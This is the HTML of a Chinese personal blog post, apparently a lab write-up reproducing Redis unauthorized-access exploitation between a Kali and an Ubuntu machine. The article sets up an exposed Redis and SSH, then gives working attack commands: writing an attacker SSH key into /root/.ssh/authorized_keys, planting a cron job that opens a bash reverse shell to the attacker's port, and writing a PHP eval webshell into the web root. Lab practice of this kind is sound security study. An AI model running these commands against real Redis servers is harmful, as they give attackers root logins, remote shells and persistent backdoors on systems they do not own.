@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="个人的漏洞复现练习，请多批评！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="复现：Redis未授权访问">
+<meta property="og:url" content="https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/index.html">
+<meta property="og:site_name" content="HDFZZF&#39;s BLOG">
+<meta property="og:description" content="个人的漏洞复现练习，请多批评！">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-04-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-04-23T04:42:02.925Z">
+<meta property="article:author" content="hdfzzf">
+<meta property="article:tag" content="Redis">
+<meta property="article:tag" content="Redis未授权">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/LOGO.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>复现：Redis未授权访问</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%20Lua%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-0543%EF%BC%89/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/04/22/%E5%8F%8C%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81%E7%9B%B8%E5%85%B3/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 漏洞信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">2. 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#redis-%E7%8E%AF%E5%A2%83"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. Redis 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E7%8E%AF%E5%A2%83"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. SSH 环境</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9Essh"><span class="toc-number">3.</span> <span class="toc-text">3. Redis 未授权漏洞——SSH</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssh-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">4.</span> <span class="toc-text">4. SSH 未授权漏洞——反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">4.1.</span> <span class="toc-text">4.1. 番外</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%86%99-webshell"><span class="toc-number">5.</span> <span class="toc-text">5. Redis 未授权漏洞——写
+webshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%BB%93%E5%90%88-ssrf"><span class="toc-number">6.</span> <span class="toc-text">Redis 未授权漏洞——结合 SSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">6. 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        复现：Redis未授权访问
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hdfzzf</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-04-22T16:00:00.000Z" itemprop="datePublished">2023-04-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Redis/" rel="tag">Redis</a>, <a class="tag-link-link" href="/tags/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/" rel="tag">Redis未授权</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">1. 漏洞信息</h1>
+<p>Redis 是一种 key-value
+键值对的非关系型数据库。默认情况下绑定在<code>127.0.0.1:6379</code>，在没有进行采用相关的策略，如添加防火墙规则避免其他非信任来源
+ip 访问等，Redis
+服务将会暴露到公网上，以及在没有设置密码认证的情况下，会导致任意用户在可以访问目标服务器的情况下进行未授权的访问
+Redis</p>
+<p>Redis 还支持本地存储，也就导致任意文件写入，攻击者在未授权访问以 root
+身份运行的 Redis 时可将 ssh 公钥写入目标服务器 <code>/root/.ssh</code>
+文件夹的 <code>authotrized_keys</code>
+文件中，进而通过对应私钥直接登录目标服务器。</p>
+<p>根据上面的描述，总结漏洞产生条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. Redis绑定在127.0.0.1:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略  </span><br><span class="line">2. 没有设置密码认证，可以免密码远程登录Redis服务  </span><br><span class="line">3. 以root身份运行Redis</span><br></pre></td></tr></table></figure>
+<h1 id="环境搭建">2. 环境搭建</h1>
+<ul>
+<li>Redis 服务器：Ubuntu 2204，IP <code>192.168.110.11</code></li>
+<li>Redis 客户端：Kali，IP <code>192.168.110.10</code></li>
+</ul>
+<h2 id="redis-环境">2.1. Redis 环境</h2>
+<p>在 Ubuntu 上先使用下面的命令下载服务器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install redis-server</span><br></pre></td></tr></table></figure>
+<p>然后修改 <code>redis.conf</code>：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423110059.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>上图中是修改之后的样子，原来的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1 ::1</span><br><span class="line">protected-mode yes</span><br></pre></td></tr></table></figure>
+<p>修改完毕之后重启 <code>redis</code> 服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. service redis restart</span><br><span class="line">2. sudo redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
+<p>建议不要使用命令 1，因为该命令会以 <code>redis</code>
+用户执行；而命令 2，则是使用 <code>root</code> 用户执行。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423110828.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423110837.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>测试一下，在 kali 上使用下面命令进行连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.110.11</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423110214.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>成功。</p>
+<h2 id="ssh-环境">2.2. SSH 环境</h2>
+<p>在 Ubuntu 上使用命令下载 ssh 服务端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openssh-server</span><br></pre></td></tr></table></figure>
+<p>然后编辑 <code>/etc/ssh/sshd_config</code>，注意别修改到了
+<code>/etc/ssh/ssh_config</code>。修改成如下：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423112323.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423112025.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>原来的内容是 ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># PubkeyAuthentication yes</span><br><span class="line"># PasswordAuthentication yes</span><br><span class="line"># PermitEmptyPasswords no</span><br></pre></td></tr></table></figure>
+<p>然后重启 ssh 即可登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure>
+<p>测试一下：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423112137.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423112152.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>登录密码就是用户的密码。</p>
+<h1 id="redis-未授权漏洞ssh">3. Redis 未授权漏洞——SSH</h1>
+<p>目的：Kali 连接 redis，然后将公钥写入到 Ubuntu 的
+<code>/root/.ssh/authorized_keys</code>，然后就可以使用 ssh 连接到
+ubuntu。</p>
+<p>第一步、kali 生成一个公钥、密钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<p>一路回车就好，默认生成的路径 <code>/home/username/.ssh/id_rsa</code>
+和
+<code>/home/username/.ssh/id_rsa.pub</code>，其中后者就是公钥，也是要写的内容。</p>
+<p>第二步、连接 redis-server，并将公钥写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. redis-cli -h 192.168.110.11</span><br><span class="line">2. config set dir /root/.ssh</span><br><span class="line">3. config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">4. set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCPPJA3hSKce41FSFHhfdhSmrqZLojczJJw2/zMUEtzJ9HLmOHrdmTNy6eg7a8L/EnVU0ZZR1Zp/LjjP13mkJd+49vmgTcqQoHOIomR7Wk11noOhM5Ojdg98U4W+0KMC8Hyk5PFbqpU5lBWaWfnr3Yntn5YlH4pJlITGZd0QG4OIZhPmhjmXKruW53e1MwB74DwgiFPkMFhU/wdwPT+1DRVeAjjwY/p7G+ivzMT6seSMZ/14yuavHARZ0foc7zVttgLm2NGc= kali@kali\n\n\n&quot;</span><br><span class="line">5. save</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423115443.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>上面方法可以，也可以使用下面的方式：</p>
+<p>先执行
+<code>(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt</code>，然后依次执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. cat foo.txt | redis-cli -h 192.168.110.11 -x set crackit</span><br><span class="line">2. redis-cli -h 192.168.110.11</span><br><span class="line">3. config set dir /root/.ssh</span><br><span class="line">4. config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">5. save</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423115128.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>成功登录。</p>
+<h1 id="ssh-未授权漏洞反弹-shell">4. SSH 未授权漏洞——反弹 shell</h1>
+<p>原理：</p>
+<ul>
+<li>向 redis 服务器写入一个定时任务，该定时任务的作用就是连接 kali
+的端口。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. redis-cli -h 192.168.110.11</span><br><span class="line">2. flushall</span><br><span class="line">3. set x &quot;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.110.10/4488 0&gt;&amp;1\n&quot;</span><br><span class="line">4. config set dir /var/spool/crontabs</span><br><span class="line">5. config set dbfilename root</span><br><span class="line">6. save</span><br></pre></td></tr></table></figure>
+<p>然后在 kali 上监听对应端口即可。可以看一下 <a
+href="../web基础漏洞/SSRF/SSRF.md#7.2.7.%20Redis%20未授权">7.2.7. Redis
+未授权</a></p>
+<h2 id="番外">4.1. 番外</h2>
+<p>由于系统的不同，定时文件位置也不同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Centos的定时任务文件在/var/spool/cron/root  </span><br><span class="line">Ubuntu定时任务文件在/var/spool/cron/crontabs/root  </span><br><span class="line">二者共有定时任务文件在/etc/crontab  </span><br></pre></td></tr></table></figure>
+<p>Redis 以 root 身份写的文件权限为644，普通用户则是664，但 Ubuntu
+要求在 <code>/var/spool/cron/crontabs/</code>
+中执行定时任务的文件权限必须是600，而如果写入
+<code>/etc/crontab</code>，由于存在乱码，因此 ubuntu
+不能正确执行定时任务；而 CentOS 在 <code>/var/spool/cron/</code>
+中的定时任务文件权限为644就能执行。</p>
+<p><strong>故ubuntu下通过Redis无法成功反弹shell</strong></p>
+<h1 id="redis-未授权漏洞写-webshell">5. Redis 未授权漏洞——写
+webshell</h1>
+<p>当 redis-server 以非 root 身份运行时，无法将
+<code>/var/spool/cron/</code> 以及 <code>/root/.ssh</code>
+设置为本地存储文件夹时，并且在 redis 有 web 目录写权限时，可以尝试往 web
+路径写 webshell。</p>
+<p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. redis-cli -h 192.168.110.11</span><br><span class="line">2. flushall</span><br><span class="line">3. set x &quot;&lt;?php eval($_POST[&#x27;ant&#x27;]);?&gt;&quot;</span><br><span class="line">4. config set dir /var/www/html</span><br><span class="line">5. config set dbfilename shell.php</span><br><span class="line">6. save</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423123645.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>可以看到，已经成功写入，至于利用方式就很多了，可以用蚁剑等。</p>
+<p>这里使用蚁剑连接：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230423124034.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<h1 id="redis-未授权漏洞结合-ssrf">Redis 未授权漏洞——结合 SSRF</h1>
+<p><a href="../web基础漏洞/SSRF/SSRF.md">SSRF</a></p>
+<h1 id="参考">6. 参考</h1>
+<ol type="1">
+<li><a
+target="_blank" rel="noopener" href="https://0xgeekcat.github.io/%E6%B5%85%E8%B0%88Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html">浅谈Redis未授权访问漏洞
+| 0xGeekCat</a></li>
+<li><a href="../web基础漏洞/SSRF/SSRF.md">SSRF</a></li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 漏洞信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">2. 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#redis-%E7%8E%AF%E5%A2%83"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. Redis 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E7%8E%AF%E5%A2%83"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. SSH 环境</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9Essh"><span class="toc-number">3.</span> <span class="toc-text">3. Redis 未授权漏洞——SSH</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssh-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">4.</span> <span class="toc-text">4. SSH 未授权漏洞——反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">4.1.</span> <span class="toc-text">4.1. 番外</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%86%99-webshell"><span class="toc-number">5.</span> <span class="toc-text">5. Redis 未授权漏洞——写
+webshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%BB%93%E5%90%88-ssrf"><span class="toc-number">6.</span> <span class="toc-text">Redis 未授权漏洞——结合 SSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">6. 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/&text=复现：Redis未授权访问"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/&title=复现：Redis未授权访问"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/&is_video=false&description=复现：Redis未授权访问"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=复现：Redis未授权访问&body=Check out this article: https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/&title=复现：Redis未授权访问"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/&title=复现：Redis未授权访问"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/&title=复现：Redis未授权访问"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/&title=复现：Redis未授权访问"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/&name=复现：Redis未授权访问&description=&lt;p&gt;个人的漏洞复现练习，请多批评！&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2023/04/23/%E5%A4%8D%E7%8E%B0%EF%BC%9ARedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/&t=复现：Redis未授权访问"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    hdfzzf
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
